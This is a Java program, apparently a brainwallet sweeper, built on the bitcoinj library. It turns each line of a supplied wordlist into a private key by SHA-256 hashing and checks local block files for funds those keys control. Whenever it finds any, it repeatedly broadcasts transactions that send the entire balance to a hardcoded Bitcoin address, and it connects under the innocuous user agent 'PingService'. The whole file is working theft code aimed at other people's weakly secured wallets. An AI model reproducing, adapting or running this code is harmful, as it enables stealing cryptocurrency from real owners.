package com.bitmixr;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.locks.ReentrantLock;

import com.google.bitcoin.core.AbstractWalletEventListener;
import com.google.bitcoin.core.Address;
import com.google.bitcoin.core.AddressFormatException;
import com.google.bitcoin.core.Block;
import com.google.bitcoin.core.BlockChain;
import com.google.bitcoin.core.ECKey;
import com.google.bitcoin.core.NetworkParameters;
import com.google.bitcoin.core.PeerGroup;
import com.google.bitcoin.core.ProtocolException;
import com.google.bitcoin.core.PrunedException;
import com.google.bitcoin.core.ScriptException;
import com.google.bitcoin.core.Transaction;
import com.google.bitcoin.core.TransactionOutput;
import com.google.bitcoin.core.Utils;
import com.google.bitcoin.core.VerificationException;
import com.google.bitcoin.core.Wallet;
import com.google.bitcoin.core.Wallet.SendRequest;
import com.google.bitcoin.discovery.DnsDiscovery;
import com.google.bitcoin.discovery.SeedPeers;
import com.google.bitcoin.store.BlockStore;
import com.google.bitcoin.store.BlockStoreException;
import com.google.bitcoin.store.MemoryBlockStore;
import com.google.common.util.concurrent.FutureCallback;
import com.google.common.util.concurrent.Futures;
import com.google.common.util.concurrent.MoreExecutors;

public class BitSweeper {
	public static class PeerRestarter {
		public volatile boolean running = true;
		public PeerGroup peerGroup;

		public PeerRestarter(PeerGroup aPeerGroup) throws InterruptedException {
			peerGroup = aPeerGroup;
		}

		public void go() {
			Thread t = new Thread() {
				@Override
				public void run() {
					while (running) {
						try {
							System.in.read();
						} catch (IOException e) {
							throw new RuntimeException(e.getMessage(), e);
						}
						if (!running) {
							return;
						}
						try {
							peerGroup.changePeer();
						} catch (Exception e) {
						}
					}
				}
			};
			t.start();
			Thread tr = new Thread() {
				@Override
				public void run() {
					while (running) {
						try {
							Thread.sleep(900000);
						} catch (InterruptedException e) {
							throw new RuntimeException(e.getMessage(), e);
						}
						if (!running) {
							return;
						}
						try {
							peerGroup.changePeer();
						} catch (Exception e) {
						}
					}
				}
			};
			tr.start();
		}
	}

	public static int getCheckpoint() {
		File checkpointFile = new File("checkpoint");
		final int checkpoint;
		if (checkpointFile.exists()) {
			BufferedReader checkpointReader;
			try {
				checkpointReader = new BufferedReader(new FileReader(checkpointFile));
			} catch (FileNotFoundException e1) {
				throw new RuntimeException(e1.getMessage(), e1);
			}
			try {
				checkpoint = Integer.parseInt(checkpointReader.readLine());
			} catch (NumberFormatException e1) {
				throw new RuntimeException(e1.getMessage(), e1);
			} catch (IOException e1) {
				throw new RuntimeException(e1.getMessage(), e1);
			}
			try {
				checkpointReader.close();
			} catch (IOException e) {
				throw new RuntimeException(e.getMessage(), e);
			}
		} else {
			checkpoint = 0;
		}
		return checkpoint;
	}

	public static void setCheckpoint(int aCheckpoint) {
		File checkpointFile = new File("checkpoint");
		if (checkpointFile.exists()) {
			checkpointFile.delete();
		}
		try {
			checkpointFile.createNewFile();
		} catch (IOException e) {
			throw new RuntimeException(e.getMessage(), e);
		}
		FileWriter writer;
		try {
			writer = new FileWriter(checkpointFile);
		} catch (IOException e) {
			throw new RuntimeException(e.getMessage(), e);
		}
		try {
			writer.write(aCheckpoint + "\n");
		} catch (IOException e) {
			throw new RuntimeException(e.getMessage(), e);
		}
		try {
			writer.close();
		} catch (IOException e) {
			throw new RuntimeException(e.getMessage(), e);
		}
	}

	public static void loadBlocks(BlockStore aStore, BlockChain aChain, NetworkParameters someParams) throws IOException, ProtocolException, VerificationException, PrunedException, BlockStoreException {
		String defaultDataDir;
		if (System.getProperty("os.name").toLowerCase().indexOf("win") >= 0) {
			defaultDataDir = System.getenv("APPDATA") + "\\Bitcoin\\blocks\\";
		} else {
			defaultDataDir = System.getProperty("user.home") + "/Bitcoin/blocks/";
		}

		// TODO: Move this to a library function
		int i = 0;
		for (int j = 0; true; j++) {
			FileInputStream stream;
			System.out.println("Opening " + defaultDataDir + String.format("blk%05d.dat", j));
			try {
				stream = new FileInputStream(new File(defaultDataDir + String.format("blk%05d.dat", j)));
			} catch (FileNotFoundException e1) {
				System.out.println(defaultDataDir + String.format("blk%05d.dat", j));
				break;
			}
			while (stream.available() > 0) {
				try {
					int nextChar = stream.read();
					while (nextChar != -1) {
						if (nextChar != ((someParams.packetMagic >>> 24) & 0xff)) {
							nextChar = stream.read();
							continue;
						}
						nextChar = stream.read();
						if (nextChar != ((someParams.packetMagic >>> 16) & 0xff))
							continue;
						nextChar = stream.read();
						if (nextChar != ((someParams.packetMagic >>> 8) & 0xff))
							continue;
						nextChar = stream.read();
						if (nextChar == (someParams.packetMagic & 0xff))
							break;
					}
				} catch (IOException e) {
					break;
				}
				byte[] bytes = new byte[4];
				stream.read(bytes, 0, 4);
				long size = Utils.readUint32BE(Utils.reverseBytes(bytes), 0);
				if (size > Block.MAX_BLOCK_SIZE || size <= 0)
					continue;
				bytes = new byte[(int) size];
				stream.read(bytes, 0, (int) size);
				Block block = new Block(someParams, bytes);
				if (aStore.get(block.getHash()) == null) {
					aChain.add(block);
				}

				if (i % 1000 == 0)
					System.out.println(i);
				i++;
			}
			stream.close();
		}

	}

	public static boolean findWalletInBlocks(Wallet wallet, NetworkParameters someParams) throws IOException, ProtocolException, VerificationException, PrunedException, BlockStoreException {
		String defaultDataDir;
		if (System.getProperty("os.name").toLowerCase().indexOf("win") >= 0) {
			defaultDataDir = System.getenv("APPDATA") + "\\Bitcoin\\blocks\\";
		} else {
			defaultDataDir = System.getProperty("user.home") + "/Bitcoin/blocks/";
		}

		// TODO: Move this to a library function
		int i = 0;
		for (int j = 0; true; j++) {
			FileInputStream stream;
			System.out.println("Opening " + defaultDataDir + String.format("blk%05d.dat", j));
			try {
				stream = new FileInputStream(new File(defaultDataDir + String.format("blk%05d.dat", j)));
			} catch (FileNotFoundException e1) {
				System.out.println(defaultDataDir + String.format("blk%05d.dat", j));
				break;
			}
			while (stream.available() > 0) {
				try {
					int nextChar = stream.read();
					while (nextChar != -1) {
						if (nextChar != ((someParams.packetMagic >>> 24) & 0xff)) {
							nextChar = stream.read();
							continue;
						}
						nextChar = stream.read();
						if (nextChar != ((someParams.packetMagic >>> 16) & 0xff))
							continue;
						nextChar = stream.read();
						if (nextChar != ((someParams.packetMagic >>> 8) & 0xff))
							continue;
						nextChar = stream.read();
						if (nextChar == (someParams.packetMagic & 0xff))
							break;
					}
				} catch (IOException e) {
					break;
				}
				byte[] bytes = new byte[4];
				stream.read(bytes, 0, 4);
				long size = Utils.readUint32BE(Utils.reverseBytes(bytes), 0);
				if (size > Block.MAX_BLOCK_SIZE || size <= 0)
					continue;
				bytes = new byte[(int) size];
				stream.read(bytes, 0, (int) size);
				Block block = new Block(someParams, bytes);
				for (Transaction t : block.getTransactions()) {
					for (TransactionOutput o : t.getOutputs()) {
						if (o.isMine(wallet)) {
							stream.close();
							return true;
						}
					}
				}

				if (i % 1000 == 0)
					System.out.println(i);
				i++;
			}
			stream.close();
		}
		return false;
	}

	public static void main(final String[] args) throws Exception {
		final NetworkParameters params = NetworkParameters.prodNet();
		BlockStore blockStore;
		BlockChain chain;
		PeerGroup peerGroup;
		final List<ECKey> keyList = new ArrayList<>();
		final ReentrantLock keyListLock = new ReentrantLock();
		// Try to read the wallet from storage, create a new one if not
		// possible.
		// Logger.getRootLogger().setLevel(Level.WARN);
		// blockStore = new ReplayableBlockStore(params, new
		// File("production.replay"), true);
		blockStore = new MemoryBlockStore(params);
		chain = new BlockChain(params, blockStore);
		peerGroup = new PeerGroup(params, chain);
		peerGroup.setUserAgent("PingService", "1.0");
		peerGroup.addPeerDiscovery(new SeedPeers(params));
		peerGroup.addPeerDiscovery(new DnsDiscovery(params));
		// peerGroup.setFastCatchupTimeSecs((System.currentTimeMillis() / 1000)
		// - 6000000);
		// PeerRestarter pr = new PeerRestarter(peerGroup);
		Wallet wallet = new Wallet(params);
		chain.addWallet(wallet);
		peerGroup.addWallet(wallet);
		wallet.addEventListener(new AbstractWalletEventListener() {
			@Override
			public void onCoinsReceived(final Wallet w, Transaction tx, BigInteger prevBalance, BigInteger newBalance) {
				final BigInteger value = tx.getValueSentToMe(w);
				System.out.println("Received pending tx for " + Utils.bitcoinValueToFriendlyString(value) + ": " + tx);
			}

			@Override
			public void onCoinsSent(Wallet wallet, Transaction tx, BigInteger prevBalance, BigInteger newBalance) {
				try {
					System.out.println("Spent: " + Utils.bitcoinValueToFriendlyString(tx.getValueSentFromMe(wallet)) + ": " + tx);
				} catch (ScriptException e) {
					throw new RuntimeException(e.getMessage(), e);
				}
			}
		});
		Thread keyThread = new Thread() {
			@Override
			public void run() {
				BufferedReader br;
				try {
					br = new BufferedReader(new FileReader(new File(args[0])));
				} catch (FileNotFoundException e1) {
					throw new RuntimeException(e1.getMessage(), e1);
				}
				String line;
				MessageDigest md;
				try {
					md = MessageDigest.getInstance("SHA-256");
				} catch (NoSuchAlgorithmException e) {
					throw new RuntimeException(e.getMessage(), e);
				}
				try {
					while ((line = br.readLine()) != null) {
						md.update(line.getBytes());
						ECKey key = new ECKey(new BigInteger(1, md.digest()));
						key.setCreationTimeSeconds(0);
						Thread.yield();
						keyListLock.lock();
						keyList.add(key);
						keyListLock.unlock();
					}
				} catch (IOException e) {
					throw new RuntimeException(e.getMessage(), e);
				}
			}
		};
		keyThread.start();
		keyThread.join();
		while (true) {
			keyListLock.lock();
			if(keyList.size()==0){
				System.out.println("Exiting normally");
				return;
			}
			if (keyList.size() > 2000) {
				wallet.keychain.addAll(keyList.subList(0, 2000));
			} else {
				wallet.keychain.addAll(keyList);
			}
			keyList.removeAll(wallet.keychain);
			keyListLock.unlock();
			System.out.println("Trying " + wallet.keychain.size() + " keys.");
			final Wallet w = wallet;
			final PeerGroup p = peerGroup;
			peerGroup.lock.lock();
			peerGroup.recalculateFastCatchupAndFilter();
			peerGroup.lock.unlock();
			peerGroup.startAndWait();
			peerGroup.waitForPeers(2);
			// pr.go();
			if (!findWalletInBlocks(wallet, params)) {
				continue;
			}
			loadBlocks(blockStore, chain, params);
			peerGroup.downloadBlockChain();
			Thread send = new Thread() {
				@Override
				public void run() {
					// Now send the coins back!
					while (true) {
						try {
							Thread.sleep(1000);
						} catch (InterruptedException e) {
							throw new RuntimeException(e.getMessage(), e);
						}
						final Address from;
						try {
							from = new Address(params, "14rksGEhDzYUiRuYDAeS94huLn4f3Kxg2o");
						} catch (AddressFormatException e1) {
							throw new RuntimeException(e1.getMessage(), e1);
						}
						//
						SendRequest request = Wallet.SendRequest.to(from, w.getBalance());
						if (!w.completeTx(request)) {
							return; // Insufficient funds.
						}
						// Ensure these funds won't be spent
						// again.
						try {
							w.commitTx(request.tx);
						} catch (VerificationException e) {
							throw new RuntimeException(e.getMessage(), e);
						}
						// // wallet.saveToFile(...);
						// // A proposed transaction is now sitting
						// // in request.tx - send it in the
						// // background.
						//
						Futures.addCallback(p.broadcastTransaction(request.tx), new FutureCallback<Transaction>() {
							@Override
							public void onFailure(Throwable t) {
								t.printStackTrace();
							}

							@Override
							public void onSuccess(Transaction result) {
								System.out.println("SENT!!!");
							}
						}, MoreExecutors.sameThreadExecutor());
					}
				}
			};
			send.start();
			Thread.sleep(20000);
			send.join();
			peerGroup.stop();
			blockStore.close();
			wallet = new Wallet(params);
			wallet.addEventListener(new AbstractWalletEventListener() {
				@Override
				public void onCoinsReceived(final Wallet w, Transaction tx, BigInteger prevBalance, BigInteger newBalance) {
					final BigInteger value = tx.getValueSentToMe(w);
					System.out.println("Received pending tx for " + Utils.bitcoinValueToFriendlyString(value) + ": " + tx);
				}

				@Override
				public void onCoinsSent(Wallet wallet, Transaction tx, BigInteger prevBalance, BigInteger newBalance) {
					try {
						System.out.println("Spent: " + Utils.bitcoinValueToFriendlyString(tx.getValueSentFromMe(wallet)) + ": " + tx);
					} catch (ScriptException e) {
						throw new RuntimeException(e.getMessage(), e);
					}
				}
			});
			blockStore = new MemoryBlockStore(params);
			chain = new BlockChain(params, blockStore);
			peerGroup = new PeerGroup(params, chain);
			peerGroup.setUserAgent("PingService", "1.0");
			peerGroup.addPeerDiscovery(new SeedPeers(params));
			peerGroup.addPeerDiscovery(new DnsDiscovery(params));
			chain.addWallet(wallet);
			peerGroup.addWallet(wallet);
		}
	}
}
